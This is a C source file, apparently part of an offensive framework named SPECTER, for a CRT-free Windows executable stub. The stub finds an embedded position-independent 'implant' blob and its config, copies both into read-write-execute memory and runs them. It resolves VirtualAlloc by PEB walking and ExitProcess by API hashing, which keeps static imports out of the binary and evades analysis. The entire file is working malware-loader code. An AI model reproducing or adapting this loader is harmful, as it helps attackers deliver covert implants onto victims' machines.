/**
 * SPECTER Stubs -- Native EXE Stub ("dotnet" format slot)
 *
 * Minimal native Windows executable that executes an embedded PIC blob.
 * CRT-free, no static imports -- resolves VirtualAlloc via PEB walk.
 *
 * Despite the name, this is a native PE (not a .NET assembly).  It
 * occupies the "dotnet" format slot in the payload builder for cases
 * where the operator wants a plain EXE delivery format.
 *
 * Build: x86_64-w64-mingw32-gcc -nostdlib -ffreestanding
 *        -e WinMainCRTStartup -o dotnet_stub.exe dotnet_stub.c
 *
 * The payload builder patches two regions:
 *   1. Config marker  (CCCCCCCCCCCCCCCC + max_size + zero-pad)
 *   2. PIC blob marker (SPECPICBLOB\0 + size + blob data)
 */

#include "stub_common.h"

/* ------------------------------------------------------------------ */
/*  Embedded data section                                              */
/* ------------------------------------------------------------------ */

/* Config region */
__attribute__((section(".data"), used))
static volatile BYTE stub_config_region[CONFIG_MARKER_LEN + sizeof(DWORD) + CONFIG_MAX_CAPACITY] = {
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    0x00, 0x10, 0x00, 0x00, /* max_size = 4096 */
};

/* PIC blob region */
__attribute__((section(".data"), used))
static volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + PIC_MAX_CAPACITY] = {
    'S','P','E','C','P','I','C','B','L','O','B','\0',
    0x00, 0x00, 0x00, 0x00,
};

/* ------------------------------------------------------------------ */
/*  EXE entry point (CRT-free)                                         */
/* ------------------------------------------------------------------ */

__attribute__((ms_abi))
void WinMainCRTStartup(void) {
    /* Inline the payload execution with granular exit codes,
       since stub_execute_payload's STUB_FAIL may not propagate. */
    g_stub_exit_code = 200; /* reached entry */

    fn_VirtualAlloc pVA = stub_resolve_virtualalloc();
    if (!pVA) { g_stub_exit_code = 100; goto done; }
    g_stub_exit_code = 201;

    PVOID img_base = stub_get_image_base();
    if (!img_base) { g_stub_exit_code = 101; goto done; }
    g_stub_exit_code = 202;

    SIZE_T img_size = stub_get_image_size(img_base);
    if (img_size == 0) { g_stub_exit_code = 102; goto done; }
    g_stub_exit_code = 203;

    PBYTE b = (PBYTE)img_base;

    PBYTE cp = stub_find_marker_in_image(b, img_size, CONFIG_MARKER, CONFIG_MARKER_LEN);
    if (!cp) { g_stub_exit_code = 103; goto done; }
    g_stub_exit_code = 204;

    DWORD cfg_max = *(DWORD *)cp;
    PBYTE cfg_data = cp + sizeof(DWORD);
    DWORD cfg_len = *(DWORD *)cfg_data;
    PBYTE cfg_blob = cfg_data + sizeof(DWORD);
    if (cfg_len == 0 || cfg_len > cfg_max) { g_stub_exit_code = 104; goto done; }
    g_stub_exit_code = 205;

    PBYTE pp = stub_find_marker_in_image(b, img_size, PIC_MARKER, PIC_MARKER_LEN);
    if (!pp) { g_stub_exit_code = 105; goto done; }
    g_stub_exit_code = 206;

    DWORD pic_sz = *(DWORD *)pp;
    PBYTE pic_dat = pp + sizeof(DWORD);
    if (pic_sz == 0) { g_stub_exit_code = 106; goto done; }
    g_stub_exit_code = 207;

    SIZE_T alloc_sz = (SIZE_T)pic_sz + sizeof(DWORD) + (SIZE_T)cfg_len;
    PVOID exec = pVA(NULL, alloc_sz, 0x3000, 0x40); /* MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE */
    if (!exec) { g_stub_exit_code = 107; goto done; }
    g_stub_exit_code = 208;

    stub_memcpy(exec, pic_dat, pic_sz);
    PBYTE cdst = (PBYTE)exec + pic_sz;
    *(DWORD *)cdst = cfg_len;
    stub_memcpy(cdst + sizeof(DWORD), cfg_blob, cfg_len);
    g_stub_exit_code = 209;

    fn_implant_entry entry = (fn_implant_entry)exec;
    entry(NULL);
    g_stub_exit_code = 99; /* PIC returned */

done:;
    DWORD code = g_stub_exit_code;

    PVOID k32 = stub_find_module(HASH_KERNEL32_DLL);
    if (k32) {
        #define HASH_EXITPROCESS 0x024773DE
        typedef void (__attribute__((ms_abi)) *fn_ExitProcess)(DWORD uExitCode);
        fn_ExitProcess pExit =
            (fn_ExitProcess)stub_find_export(k32, HASH_EXITPROCESS);
        if (pExit)
            pExit(code);
    }

    /* Fallback: infinite loop (should never reach here) */
    for (;;) {}
}
